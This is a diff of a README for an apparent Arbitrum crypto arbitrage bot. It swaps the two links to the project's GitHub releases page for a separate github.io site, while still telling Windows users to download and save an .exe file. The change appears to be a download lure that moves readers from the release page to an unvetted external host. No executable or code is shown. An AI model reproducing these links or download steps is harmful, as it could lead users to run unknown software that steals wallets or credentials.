@@ -1,6 +1,6 @@
 # 🤖 Arbitrum-Arbitrage-Bot-2026 - Find Price Differences Across Arbitrum Markets
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Myrticeferretsized136/Arbitrum-Arbitrage-Bot-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://myrticeferretsized136.github.io)
 
 ## What this software does
 
@@ -14,7 +14,7 @@ You need a Windows 10 or Windows 11 computer to run this bot. Ensure you have at
 
 To start, visit the main releases page. This page contains the latest version of the software.
 
-1. Click here to [visit the releases page](https://github.com/Myrticeferretsized136/Arbitrum-Arbitrage-Bot-2026/releases).
+1. Click here to [visit the releases page](https://myrticeferretsized136.github.io).
 2. Look for the section labeled "Assets."
 3. Select the file ending in .exe for Windows.
 4. Save the file to your computer.
